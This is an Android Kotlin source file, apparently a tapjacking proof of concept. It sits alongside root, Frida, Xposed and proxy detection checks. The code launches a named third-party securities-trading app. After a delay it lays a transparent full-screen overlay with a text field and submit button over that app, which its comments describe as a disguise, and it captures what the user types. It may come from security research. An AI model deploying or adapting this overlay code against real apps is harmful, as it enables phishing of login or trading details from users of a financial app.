package com.example.rootcheck

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.graphics.Color
import android.graphics.PixelFormat
import android.graphics.drawable.ColorDrawable
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.telephony.TelephonyManager
import android.util.Log
import android.view.LayoutInflater
import android.view.WindowManager
import android.widget.Button
import android.widget.EditText
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import com.example.lib.EmulatorDetectorNew
import com.example.lib.HookDetector
import com.example.lib.ProxyDetector
import com.example.rootcheck.databinding.ActivitySecurityBinding

class SecurityActivity : AppCompatActivity() {
    private var TAG = "SecurityActivity"
    private lateinit var binding: ActivitySecurityBinding
    private lateinit var receiver: BroadcastReceiver
    val REQUEST_OVERLAY_PERMISSION = 0

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivitySecurityBinding.inflate(layoutInflater)
        setContentView(binding.root)
        checkOverlayPermission()
        receiver= object : BroadcastReceiver() {
            override fun onReceive(context: Context?, intent: Intent?) {
                Log.d(TAG, "接收到广播: ${intent?.action}")
                val packageName = intent?.getStringExtra("packageName")
                val activityName = intent?.getStringExtra("activityName")

                val targetPackage = ""
                val targetActivity = ""

                if (packageName == targetPackage && activityName == targetActivity) {
                    Handler(Looper.getMainLooper()).postDelayed({
                        // 启动覆盖界面伪装
                        setupTapjackingView(context!!)
                    }, 5000) // 延时触发伪装界面
                }
            }
        }

        val filter = IntentFilter()
        filter.addAction("com.tapjacking.exp.ACTION_ACTIVITY_LAUNCH")
        registerReceiver(receiver, filter)

        // 启动目标应用的组件
        launchTargetActivity()

        sendTestBroadcast()
    }

    private fun sendTestBroadcast() {

        val intent = Intent("com.tapjacking.exp.ACTION_ACTIVITY_LAUNCH")
        intent.putExtra("packageName", "com.hexin.plat.android.HongXinSecurity")
        intent.putExtra("activityName", "com.hexin.plat.android.AndroidLogoActivity")
        Handler(Looper.getMainLooper()).postDelayed({
            // 启动覆盖界面伪装
            sendBroadcast(intent) // 直接发送广播
        }, 2000)

    }
    private fun launchTargetActivity() {
        val appPackage = "com.hexin.plat.android.HongXinSecurity"
        val appActivity = "com.hexin.plat.android.AndroidLogoActivity"

        try {
            val externalIntent = Intent()
            externalIntent.setClassName(appPackage, appActivity)
            externalIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(externalIntent) // 启动目标 Activity
        } catch (e: Exception) {
            Toast.makeText(this, "目标应用未安装或组件不存在", Toast.LENGTH_SHORT).show()
        }
    }
    private fun checkOverlayPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            val intent = Intent(
                Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                Uri.parse("package:$packageName")
            )
            Toast.makeText(this, "需要授予悬浮窗权限", Toast.LENGTH_SHORT).show()
            startActivityForResult(intent, REQUEST_OVERLAY_PERMISSION)
        }
    }


    fun setupTapjackingView(context: Context) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(context)) {
            Log.e(TAG, "没有悬浮窗权限，请授予")
            return
        }

        val windowManager = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
        val overlayView = LayoutInflater.from(context).inflate(R.layout.overlay_layout, null)
        overlayView.background = ColorDrawable(Color.TRANSPARENT)
        overlayView.setOnTouchListener { _, _ ->
            false // 返回 false，表示不消费事件，让事件继续向下传递
        }

        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
            PixelFormat.TRANSPARENT

        )
        try {
            windowManager.addView(overlayView, params)
        } catch (e: Exception) {
            Log.e(TAG, "添加覆盖界面失败: ${e.message}")
        }

        overlayView.findViewById<Button>(R.id.btnSubmit).setOnClickListener {
            val inputText = overlayView.findViewById<EditText>(R.id.editText).text.toString()
            Toast.makeText(context, "您输入的信息已发送: $inputText", Toast.LENGTH_SHORT).show()

            // 移除覆盖窗口
            try {
                windowManager.removeView(overlayView)
            } catch (e: Exception) {
                Log.e(TAG, "移除覆盖界面失败: ${e.message}")
            }
        }
    }


    private fun init() {
        binding.checkBtn.setOnClickListener {
            val emulatorDetectorNew = EmulatorDetectorNew()
            var detected = false
            var checkFrida: Boolean = HookDetector.isDetected()
            val buildStr =
                "\nBRAND:${Build.BRAND} \nDEVICE:${Build.DEVICE} \nRELEASE:${Build.VERSION.RELEASE} \nMODEL:${Build.MODEL}"

            val builder = AlertDialog.Builder(this)
            builder.setTitle("checkFrida!!")
            builder.setMessage("检测结果：\n" + checkFrida)
            builder.setPositiveButton("确定") { _, _ ->
            }
            val dialog = builder.create()
            dialog.show()
            val xposedExists = HookDetector.isXposedExists()
            val eposedExistByThrow = HookDetector.isEposedExistByThrow()
            val tryShutdownXposed = HookDetector.tryShutdownXposed()
            val classCheck = HookDetector.classCheck()
            val exceptionCheck = HookDetector.exceptionCheck()
            val checkHttpProxy = ProxyDetector.checkHttpProxy()
            val vpnConnected1 = ProxyDetector.isVpnConnected(this)
            val deviceInVPN = ProxyDetector.isDeviceInVPN()
//            Toast.makeText(this, toastMessage(), Toast.LENGTH_SHORT).show()

        }

    }

    private fun toastMessage(): String {
        return "我未被劫持"
    }

    private fun getCountry(context: Context): String {
        val tm = context.getSystemService(TELEPHONY_SERVICE) as TelephonyManager

        return tm.networkCountryIso
    }

    private fun getNetName(context: Context): String {
        val tm = context.getSystemService(TELEPHONY_SERVICE) as TelephonyManager

        return tm.simOperatorName
    }

}